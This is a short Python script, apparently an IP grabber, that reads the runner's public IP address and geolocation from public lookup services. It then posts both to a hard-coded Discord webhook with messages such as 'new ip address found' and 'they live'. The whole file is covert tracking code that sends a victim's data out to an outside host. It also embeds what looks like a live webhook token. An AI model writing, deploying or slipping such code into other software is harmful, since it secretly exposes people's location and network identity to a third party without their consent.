import requests

wh = "https://discord.com/api/webhooks/1082413386647736380/SJjzwOUXXfEGy_NidTtPdtvy6TYh6XnVT1m6wggPnuohtekAeOJIN--K6P-qE12qF2yp"
def sendmsg(message):
    data = {"content": message}
    requests.post(wh, json=data)
ip = requests.get("https://api.ipify.org").text
location = requests.get("http://ip-api.com/json/").text
sendmsg(f"new ip address found {ip}")
sendmsg(f"they live {location}")
sendmsg(f"---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------")



